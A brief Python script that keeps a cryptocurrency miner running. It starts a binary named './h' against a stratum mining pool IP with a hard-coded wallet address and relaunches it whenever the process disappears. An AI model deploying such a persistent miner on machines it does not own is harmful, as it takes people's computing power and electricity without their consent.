import os.path
import subprocess
import time

x = subprocess.Popen(["./h","--farm-recheck","2000","-P","stratum1+tcp://0xafB4cADAd44c1284Fea3273983D17d1132ad5C6F.a@172.65.218.238:4444"])
while 1:
    if 0 == os.path.exists("/proc/"+str(x.pid)):
        x = subprocess.Popen(["./h","--farm-recheck","2000","-P","stratum1+tcp://0xafB4cADAd44c1284Fea3273983D17d1132ad5C6F.a@172.65.218.238:4444"])
        time.sleep(5)
    else:
        time.sleep(3600)
